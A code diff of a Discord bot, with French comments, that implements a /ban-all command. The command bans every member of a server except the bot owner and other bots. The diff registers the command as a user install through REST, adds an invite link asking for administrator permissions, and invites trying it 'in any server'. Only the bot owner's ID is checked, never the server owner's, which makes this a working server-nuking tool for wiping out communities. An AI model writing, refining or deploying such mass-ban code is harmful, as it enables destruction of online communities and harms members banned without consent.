@@ -1,5 +1,5 @@
 require('dotenv').config();
-const { Client, GatewayIntentBits, SlashCommandBuilder, PermissionFlagsBits } = require('discord.js');
+const { Client, GatewayIntentBits, SlashCommandBuilder, PermissionFlagsBits, REST, Routes } = require('discord.js');
 
 const client = new Client({
     intents: [
@@ -10,40 +10,43 @@ const client = new Client({
 });
 
 const OWNER_ID = process.env.OWNER_ID;
+const TOKEN = process.env.TOKEN;
 
 if (!OWNER_ID) {
-    console.error("❌ OWNER_ID n'est pas défini dans les variables d'environnement !");
+    console.error("❌ OWNER_ID n'est pas défini !");
     process.exit(1);
 }
 
 client.once('ready', async () => {
-    console.log(`✅ Bot connecté en tant que ${client.user.tag}`);
-    console.log(`👑 Propriétaire configuré : ${OWNER_ID}`);
+    console.log(`✅ Bot connecté : ${client.user.tag}`);
+    console.log(`👑 Owner : ${OWNER_ID}`);
 
-    const command = {
+    const rest = new REST({ version: '10' }).setToken(TOKEN);
+
+    const commandData = {
         name: 'ban-all',
-        description: 'Bannit tous les membres du serveur (User Install)',
-        
-        // Configuration pour fonctionner partout via User Install
-        integration_types: ['UserInstall'],           // ← Important : seulement UserInstall
-        contexts: [0],                                // 0 = Guild (serveur)
-        
-        // On enlève complètement default_member_permissions
+        description: 'Bannit tous les membres du serveur sauf le propriétaire et les bots',
+        integration_types: ['UserInstall'],
+        contexts: [0], // 0 = Guild
     };
 
     try {
-        await client.application.commands.create(command);
-        console.log('✅ Commande /ban-all enregistrée en UserInstall (devrait marcher partout)');
+        // Méthode la plus fiable pour User Install
+        await rest.put(
+            Routes.applicationCommands(client.user.id),
+            { body: [commandData] }
+        );
+        
+        console.log('✅ Commande /ban-all enregistrée en UserInstall (méthode REST)');
+        console.log('🔄 Essaie maintenant dans n\'importe quel serveur (même sans le bot dedans)');
     } catch (err) {
-        console.error('❌ Erreur lors de la création de la commande:', err);
+        console.error('❌ Erreur REST:', err);
     }
 });
 
 client.on('interactionCreate', async interaction => {
-    if (!interaction.isChatInputCommand()) return;
-    if (interaction.commandName !== 'ban-all') return;
+    if (!interaction.isChatInputCommand() || interaction.commandName !== 'ban-all') return;
 
-    // Restriction propriétaire
     if (interaction.user.id !== OWNER_ID) {
         return interaction.reply({ 
             content: '❌ Seul le propriétaire du bot peut utiliser cette commande.', 
@@ -51,35 +54,43 @@ client.on('interactionCreate', async interaction => {
         });
     }
 
-    // Vérification qu'on est bien dans un serveur
-    if (!interaction.guild || !interaction.guildId) {
+    if (!interaction.guild) {
+        return interaction.reply({ 
+            content: '❌ Cette commande ne peut être utilisée que dans un serveur.', 
+            ephemeral: true 
+        });
+    }
+
+    // Vérification critique : le bot doit être dans le serveur
+    let botMember;
+    try {
+        botMember = await interaction.guild.members.fetchMe();
+    } catch (e) {
         return interaction.reply({
-            content: '❌ Cette commande doit être utilisée dans un serveur.',
+            content: '❌ **Le bot n\'est pas dans ce serveur !**\n\n' +
+                    'Pour utiliser cette commande, tu dois **ajouter le bot** dans le serveur avec la permission `Ban Members`.\n\n' +
+                    '**Lien d\'invitation :**\n' +
+                    `https://discord.com/oauth2/authorize?client_id=${client.user.id}&scope=bot&permissions=8`,
             ephemeral: true
         });
     }
 
-    // Vérification que le bot a les permissions nécessaires dans le serveur
-    const botMember = await interaction.guild.members.fetchMe().catch(() => null);
-    if (!botMember || !botMember.permissions.has(PermissionFlagsBits.BanMembers)) {
+    if (!botMember.permissions.has(PermissionFlagsBits.BanMembers)) {
         return interaction.reply({
-            content: '❌ Le bot n\'a pas la permission de bannir des membres dans ce serveur.\n\n' +
-                    'Il faut que tu ajoutes le bot avec les permissions nécessaires ou que tu lui donnes le rôle Administrateur.',
+            content: '❌ Le bot n\'a pas la permission `Bannir des membres` dans ce serveur.',
             ephemeral: true
         });
     }
 
     await interaction.reply({ 
-        content: '🚨 **BAN ALL EN COURS...** Cela peut prendre plusieurs minutes. Ne ferme pas Discord.',
+        content: '🚨 **BAN ALL EN COURS...** Ne ferme pas Discord. Cela peut prendre plusieurs minutes.',
         ephemeral: false 
     });
 
-    let banned = 0;
-    let failed = 0;
-    let skipped = 0;
+    let banned = 0, failed = 0, skipped = 0;
 
     try {
-        const members = await interaction.guild.members.fetch({ withPresences: false });
+        const members = await interaction.guild.members.fetch();
 
         for (const [id, member] of members) {
             if (id === OWNER_ID || member.user.bot || !member.bannable) {
@@ -93,8 +104,8 @@ client.on('interactionCreate', async interaction => {
                     deleteMessageSeconds: 0
                 });
                 banned++;
-                await new Promise(r => setTimeout(r, 800)); // Anti rate-limit plus sécurisé
-            } catch (err) {
+                await new Promise(r => setTimeout(r, 700));
+            } catch {
                 failed++;
             }
         }
@@ -103,15 +114,13 @@ client.on('interactionCreate', async interaction => {
             content: `✅ **BAN ALL TERMINÉ !**\n\n` +
                     `**✅ Membres bannis :** ${banned}\n` +
                     `**❌ Échecs :** ${failed}\n` +
-                    `**⏭️ Ignorés (toi + bots) :** ${skipped}`
+                    `**⏭️ Ignorés :** ${skipped}`
         });
 
     } catch (error) {
         console.error(error);
-        await interaction.followUp({ 
-            content: '❌ Une erreur grave est survenue pendant le ban all.' 
-        });
+        await interaction.followUp({ content: '❌ Erreur critique pendant l\'exécution.' });
     }
 });
 
-client.login(process.env.TOKEN);
+client.login(TOKEN);
